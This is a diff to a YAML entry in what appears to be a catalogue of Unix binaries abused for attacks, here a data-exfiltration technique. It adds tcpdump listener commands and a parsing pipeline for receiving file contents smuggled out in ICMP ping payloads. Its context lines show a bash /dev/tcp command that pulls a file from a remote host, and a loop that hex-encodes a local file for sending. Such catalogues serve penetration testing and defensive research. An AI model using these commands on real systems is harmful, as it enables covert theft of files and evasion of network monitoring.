@@ -17,7 +17,11 @@ functions:
       code: |
         bash -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'
   data-exfiltration:
-    - description: Exfiltrate file contents or command output over ICMP packets embedded in ping requests.
+    - description: | 
+        Exfiltration over ICMP packets embedded in ping requests (increment the timeout based on the file content)
+        Set a listener using tcpdump: `sudo timeout 10 tcpdump -i any -l -n -XX 'icmp' 2>/dev/null | grep '0x0060:'` (will require manual parsing cleaning)
+        Automate parsing cleaner: `sudo timeout 10 tcpdump -i any -l -n -XX 'icmp' 2>/dev/null | grep '0x0060:' | sed -n 's/^.*0x0060:.*[[:space:]]\{2,\}//p' | uniq | tr -d '\n' | sed 's/\./\.\n/g'`
+        (may miss dots and spaces)
       code: |
         hex=$(while IFS= read -r line; do for ((i=0; i<${#line}; i++));
         do printf "%02x" "'${line:$i:1}"; done; done < $LFILE); i=0;
